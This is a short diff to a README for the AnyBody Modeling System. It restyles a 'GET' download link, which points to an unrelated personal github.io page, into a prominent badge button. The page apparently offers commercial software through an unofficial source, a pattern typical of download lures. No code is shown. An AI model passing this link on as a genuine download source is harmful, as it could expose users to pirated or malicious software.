@@ -1,7 +1,7 @@
 
 # AnyBody Modeling System
 
-[GET AnyBody Modeling System](https://carolcarteru742.github.io/.github/AnyBody)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20AnyBody-0078D6?style=for-the-badge&logoColor=white)](https://carolcarteru742.github.io/.github/AnyBody)
 
 ![AnyBody Modeling System preview](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0kzWPsxp_3ICbj90B1AqYr1kLmEBRcap-Iq6_WiZRJg&s=10)
 
